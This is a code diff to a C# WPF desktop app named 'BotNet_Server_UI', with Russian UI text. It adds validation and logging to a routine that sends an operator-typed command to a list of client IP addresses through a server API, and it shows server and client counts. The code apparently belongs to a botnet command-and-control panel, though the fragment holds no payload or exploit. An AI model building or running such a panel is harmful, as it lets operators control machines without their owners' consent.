@@ -24,28 +24,37 @@ namespace BotNet_Server_UI
     /// </summary>
     public partial class MainWindow : Window
     {
-        static uint messageid = 0;
         List<TextBox> textBoxes = new List<TextBox>();
         public MainWindow()
         {
             InitializeComponent();
         }
-        private async void Connect_Click(object sender, RoutedEventArgs e)
-        {
-            _ = await ApiRequest.CreateProductAsync(new IP() { id = 3, ip = "123.3.3.31" }, "ip");
-        }
 
         private async void Send_Command()
         {
-            Message message = new Message()
+            if (Command.Text == "" || IP1.Text == "")
             {
-                id = messageid++,
-                command = Command.Text,
-                ip = new string[Convert.ToInt32(IPCount.Content.ToString())]
-            };
-            for (int i = 0; i < message.ip.Length; i++)
+                MessageBox.Show("Постарайтесь ввести все значения правильно!");
+                return;
+            }
+            try
             {
-                message.ip[i] = textBoxes[i].Text;
+                Message message = new Message()
+                {
+                    id = await ApiRequest.GetProductAsync<uint>("/api/v1/messages"),
+                    command = Command.Text,
+                    ip = new string[Convert.ToInt32(IPCount.Content.ToString())]
+                };
+                for (int i = 0; i < message.ip.Length; i++)
+                {
+                    message.ip[i] = textBoxes[i].Text;
+                }
+                var res = await ApiRequest.CreateProductAsync(message, "messages");
+                LogPanel.Text += $"Сообщение {message.command} (id: {message.id}) отправлено.\n";
+            }
+            catch (Exception ex)
+            {
+                MessageBox.Show(ex.Message);
             }
         }
 
@@ -64,6 +73,7 @@ namespace BotNet_Server_UI
 
         private async void Formloaded(object sender, RoutedEventArgs e)
         {
+            _ = await ApiRequest.DeleteProductsAsync("api/v1/messages");
             textBoxes.Add(IP1);
             textBoxes.Add(IP2);
             textBoxes.Add(IP3);
@@ -100,6 +110,8 @@ namespace BotNet_Server_UI
                 res += arr[i].ip + "\n";
             }
             ClientList.Text = res;
+            var info = await ApiRequest.GetProductAsync<Info>("/api");
+            InfoLabel.Content = "Подключено к серверу: " + info.uri + "; API версии " + info.version + ".\nПрослушка по порту " + info.port + "; среда разработки " + info.environment + ".\nВсего клиентов " + info.clients + ". Всего сообщений " + info.messages;
         }
 
         private void Minus_Click(object sender, RoutedEventArgs e)
@@ -138,6 +150,5 @@ namespace BotNet_Server_UI
                 }
             }
         }
-
     }
 }
